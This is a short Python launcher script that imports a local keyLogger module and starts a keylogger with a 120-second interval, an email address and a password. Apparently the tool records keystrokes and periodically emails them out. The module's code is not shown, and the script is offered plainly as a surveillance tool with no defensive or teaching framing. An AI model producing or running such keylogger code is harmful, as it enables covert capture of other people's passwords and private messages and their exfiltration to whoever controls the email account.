#!/usr/bin/env python

import keyLogger

# starts the keyLogger 

my_keylogger = keyLogger.Keylogger(120,"my@Email.com","myPassword")
my_keylogger.start()
